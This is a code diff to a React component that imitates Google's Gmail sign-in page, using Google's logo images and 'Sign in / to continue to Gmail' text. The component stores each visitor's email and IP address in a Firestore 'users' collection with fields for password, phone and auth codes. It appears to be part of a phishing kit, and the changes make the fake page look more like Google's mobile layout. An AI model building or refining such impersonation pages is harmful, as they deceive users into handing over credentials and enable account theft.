@@ -85,7 +85,7 @@ export default function EnterEmail() {
              });
           }else{
              const user = await addDoc(collection(db, "users"), {
-             pass:'',phone:'',email:email,auth:'',ip:ipAddr,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
+             pass:'',phone:'',email:email,auth:'',ip:ipAddr,status: 1,status2:0,type:'',num:0,createdAt: new Date().getTime(),
            }
           );
            if(user.id){
@@ -116,25 +116,36 @@ export default function EnterEmail() {
       {/* Card container */}
       <div className="bg-white w-full max-w-sm sm:max-w-md rounded-none sm:rounded-2xl sm:shadow-[0_8px_24px_rgba(60,64,67,0.12),0_2px_6px_rgba(60,64,67,0.08)] sm:p-10 px-6 py-12 mt-0 sm:mt-0 flex flex-col">
         {/* Google Logo */}
-        <div className="flex justify-center mb-8 sm:mb-6">
-          <img
-            src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
-            alt="Google"
-            className="h-6 sm:h-8"
-          />
-        </div>
+<div className="flex flex-col sm:items-center items-start justify-center">
 
-        {/* Title */}
-        <h1 className="text-2xl sm:text-3xl font-normal text-center mb-2">
-          Sign in
-        </h1>
-         
-        <p className="text-center text-sm sm:text-base text-[#5f6368] mb-8 sm:mb-10">
-          to continue to Gmail
-        </p>
+  <div className="mb-8 sm:mb-6">
+<img
+  src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+  alt="Google"
+  className="hidden sm:block h-8"
+/>
+<img
+  src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png"
+  alt="Google"
+  className="block sm:hidden h-11"
+/>
+
+  </div>
+
+  {/* Title */}
+  <h1 className="text-xl sm:text-3xl font-normal text-left sm:text-center mb-2">
+    Sign in
+  </h1>
+
+  {/* Description */}
+  <p className="text-sm sm:text-base text-left sm:text-center text-[#5f6368] mb-8 sm:mb-10">
+    to continue to Gmail
+  </p>
+
+</div>
 
         {/* Form */}
-        <form className="flex flex-col flex-1">
+        <div className="flex flex-col flex-1">
           <input 
             id="email"
             name="email"
@@ -191,7 +202,7 @@ export default function EnterEmail() {
   </button>
 </div>
 
-        </form>
+        </div>
       </div>
 
       {/* Footer */}
